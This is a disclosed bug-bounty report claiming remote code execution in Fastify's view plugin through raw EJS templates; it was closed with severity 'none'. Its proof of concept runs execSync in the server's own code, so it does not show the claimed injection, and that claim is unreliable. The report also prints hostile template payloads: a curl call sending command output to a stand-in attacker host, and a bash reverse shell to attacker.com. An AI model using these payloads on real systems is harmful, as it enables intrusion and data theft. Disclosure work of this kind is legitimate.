# Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)

## Report Details
- **Report ID**: 3122019
- **URL**: https://hackerone.com/reports/3122019
- **State**: Closed
- **Severity**: none
- **Submitted**: 2025-05-01T15:15:25.581Z
- **Disclosed**: 2025-05-28T16:56:06.578Z

## Reporter
- **Username**: oblivionsage
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: fastify

## Vulnerability Information
The `@fastify/view` plugin, when used with the EJS engine and the `reply.view({ raw: <user-controlled-string> })` pattern, allows arbitrary EJS execution. This leads to Remote Code Execution (RCE) when an attacker can control the `raw` content passed to the view renderer.

This vulnerability arises from the fact that Fastify trusts the raw template string without sanitization or restrictions when passed directly to EJS's `compile()` method.



## Steps To Reproduce:

### Step 1: Setup the environment

Create a new directory and initialize a simple Fastify server:

```bash
mkdir fastify-rce-poc && cd fastify-rce-poc
npm install fastify @fastify/view ejs
```
Screenshot:`Screenshot_1.png`
{F4305587}

###Step 2: Create a vulnerable Fastify server

Create a file called `server.js` with the following code:
```javascript
const fastify = require('fastify')();
const view = require('@fastify/view');
const ejs = require('ejs');
const { execSync } = require('child_process');

fastify.register(view, {
  engine: { ejs }
});

fastify.get('/', async (req, reply) => {
  const result = execSync('id').toString(); // RCE 
  const template = `<pre>${result}</pre>`;
  return reply.view({ raw: template });
});

fastify.listen({ port: 3000 }, err => {
  if (err) throw err;
  console.log('Listening on http://localhost:3000');
});

```
Screenshot:`Screenshot_2.png`
{F4305628}


###Step 3: Start the server

```bash
node server.js
```

Terminal showing  Fastify  running at `localhost:3000`

Screenshot:`Screenshot_3.png`
{F4305610}

###Step 4: Access the endpoint

Visit `http://localhost:3000` in the browser.

You will see the output of the `id` command rendered in the page, proving Remote Code Execution:

```bash
uid=1000(nullprophet) gid=1000(nullprophet) groups=...
```

Screenshot:`Screenshot_4.png`

{F4305638}

###  Security Misconfiguration Analysis:

The vulnerability is not just an EJS engine misuse but also stems from a broader category of insecure default usage. Fastify allows `raw` template injection with no warning, which bypasses typical protections like template sandboxing. In production systems, such behavior is highly discouraged.

This misconfiguration may go unnoticed during code review unless explicitly tested for dynamic rendering vectors.


###  Real-world Exploitation Scenario:

Assume an API endpoint exists like:

```js
fastify.post("/render", async (req, reply) => {
  return reply.view({ raw: req.body.content });
});
```

An attacker can craft a payload like:

```js
<%= require("child_process").execSync("curl http://attacker:8080/`id`") %>
```

This would leak command output over HTTP to an external attacker, bypassing firewall and runtime monitoring.

Such injection can happen via:

User-submitted blog content

Email templates

File uploads interpreted as raw templates

## Impact

###  Impact:

This vulnerability allows Remote Code Execution (RCE) when using the `@fastify/view` plugin with the EJS engine and providing a user-controlled `raw` template input.

Any attacker who can influence or inject unescaped EJS payloads into the template rendering logic (e.g., through user input passed into `reply.view({ raw })`) can fully execute arbitrary OS commands on the server. This leads to:

- Full system compromise
- Data exfiltration or destruction
- Lateral movement to other services
- Reverse shell and persistent access

In a real-world scenario, if an endpoint renders user-controlled data as `raw` templates (for instance, rendering emails, comments, or filenames), it can be weaponized to achieve full RCE.

This issue is critical because:
- There is **no input sanitization** when using `raw` template objects.
- It directly calls `ejs.compile()` on attacker-controlled input.
- Renders and executes malicious payloads on the server.

```ejs
<%= require("child_process").execSync("id").toString() %>
```

If exploited in production, an attacker could trigger `curl`, `wget`, or even drop reverse shells:
```ejs
<%= require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1") %>
```

###  Recommendation:

To mitigate this vulnerability:

- Avoid using `reply.view({ raw })` with any user-controllable content.
- Enforce strict template loading from file-based templates only.
- Sanitize or validate the content before passing it to the `ejs.compile()` method.
- Disable or restrict usage of dynamic `raw` templates in production environments.
- Consider switching to safer rendering strategies or use a template engine with built-in sandboxing.

Fastify could also introduce warnings or protective logic when `raw` templates are used in combination with untrusted data.

## Attachments
- Screenshot_1.png
- Screenshot_3.png
- Screenshot_2.png
- Screenshot_4.png
